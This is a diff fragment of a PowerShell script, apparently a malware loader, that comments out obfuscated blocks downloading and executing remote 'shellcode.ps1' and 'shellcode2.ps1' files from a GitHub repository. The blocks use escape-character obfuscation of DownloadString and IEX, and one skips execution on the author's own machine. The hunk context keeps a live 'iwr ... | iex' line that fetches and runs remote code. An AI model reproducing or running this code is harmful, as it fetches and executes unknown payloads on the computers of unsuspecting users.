@@ -86,15 +86,15 @@ iwr https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt |iex
 # $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 # Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
+# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
-    $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
-    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
-    Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
-}
+# if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
+#     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
+#     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
+#     Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+# }
 
 
 
